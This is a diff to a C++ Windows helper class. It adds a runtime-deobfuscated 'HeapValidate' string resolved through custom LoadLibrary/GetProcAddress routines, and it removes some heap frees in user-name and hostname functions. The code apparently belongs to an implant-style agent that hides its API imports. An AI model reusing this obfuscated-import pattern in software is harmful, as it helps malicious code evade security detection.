@@ -558,6 +558,12 @@ WinApiCustom::WinApiCustom()
 		STRING_REMOVE_DIRECTORY_A_LEN,
 		strRemoveDirectoryA);
 
+	static CHAR strHeapValidate[STRING_HEAP_VALIDATE_LEN + 1] = ""; // "HeapValidate"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_HEAP_VALIDATE,
+		STRING_HEAP_VALIDATE_LEN,
+		strHeapValidate);
+
 	// Load necessary modules
 	loadedModules.hNtdll = LoadLibraryCustom(strNtdllDll);
 	loadedModules.hKernelbase = LoadLibraryCustom(strKernelbaseDll);
@@ -626,6 +632,7 @@ WinApiCustom::WinApiCustom()
 	loadedFunctions.WriteFile = (BOOL(*)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped))GetProcAddressCustom(loadedModules.hKernel32, strWriteFile);
 	loadedFunctions.DeleteFileA = (BOOL(*)(LPCSTR lpFileName))GetProcAddressCustom(loadedModules.hKernel32, strDeleteFileA);
 	loadedFunctions.RemoveDirectoryA = (BOOL(*)(LPCSTR lpPathName))GetProcAddressCustom(loadedModules.hKernel32, strRemoveDirectoryA);
+	loadedFunctions.HeapValidate = (BOOL(*)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem))GetProcAddressCustom(loadedModules.hKernel32, strHeapValidate);
 }
 
 /* Destructor for WinApiCustom */
@@ -743,9 +750,6 @@ void WinApiCustom::GetUserNameCustom(OUT LPVOID *ppUserName, OUT LPVOID *ppDomai
 CLEANUP:
 	if (hCurrentProcessToken != NULL)
 		this->loadedFunctions.CloseHandle(hCurrentProcessToken);
-
-	if (pTokenUser != NULL)
-		this->HeapFreeCustom(pTokenUser);
 }
 
 /*
@@ -772,10 +776,7 @@ LPVOID WinApiCustom::GetFQDNComputer()
 			COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified,
 			(LPSTR)computerNameBuf,
 			&size))
-	{
-		this->HeapFreeCustom(computerNameBuf);
 		return NULL;
-	}
 
 	return computerNameBuf;
 }
